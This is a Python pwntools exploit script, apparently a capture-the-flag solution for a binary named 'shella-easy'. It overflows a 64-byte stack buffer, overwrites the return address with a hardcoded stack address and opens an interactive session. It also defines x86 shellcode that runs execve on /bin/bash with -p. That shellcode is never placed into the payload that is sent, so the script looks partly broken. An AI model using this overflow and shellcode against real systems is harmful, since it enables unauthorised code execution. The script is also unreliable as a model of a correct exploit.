from pwn import *
context.terminal = ['tmux', 'splitw', '-h']

p = process("./shella-easy")
gdb.attach(p, '''
break *0x080484df
break *0x0804853e
''')

deadbeef = 0xdeadbeef
pop_ebx = 0x0804836d
shell_addr = 0xffaf5fc0
shellcode = "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"

buf = "A" * 64
buf += p32(deadbeef)
buf += "B" * 8
buf += p32(shell_addr)
buf += "D" * 40

p.recvline()
p.sendline(buf)
p.interactive()
